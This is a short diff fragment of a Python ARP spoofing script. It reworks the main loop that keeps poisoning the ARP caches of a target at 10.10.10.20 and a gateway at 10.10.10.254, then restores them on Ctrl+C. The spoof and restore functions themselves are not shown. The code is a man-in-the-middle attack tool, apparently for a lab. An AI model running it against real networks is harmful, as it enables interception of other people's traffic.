@@ -33,17 +33,18 @@ def restore(destination_ip, source_ip):
 target_ip = "10.10.10.20"
 gateway_ip = "10.10.10.254"
 
-try:
-    sent_packets_count = 0
-    while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
-        sent_packets_count = sent_packets_count + 2
-        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
-        time.sleep(2)
+if __name__ == '__main__':
+    try:
+        counter = 0
+        while True:
+            spoof(target_ip, gateway_ip)
+            spoof(gateway_ip, target_ip)
+            counter += 2
+            print("\rPackets Sent " + str(counter))
+            time.sleep(2)
 
-except KeyboardInterrupt:
-    print("\nCtrl + C pressed.............Exiting")
-    restore(gateway_ip, target_ip)
-    restore(target_ip, gateway_ip)
-    print("[+] Arp Spoof Stopped")
+    except KeyboardInterrupt:
+        print("KeyboardInterrupt")
+        restore(gateway_ip, target_ip)
+        restore(target_ip, gateway_ip)
+        print("Spoofing topped, addresses restored")
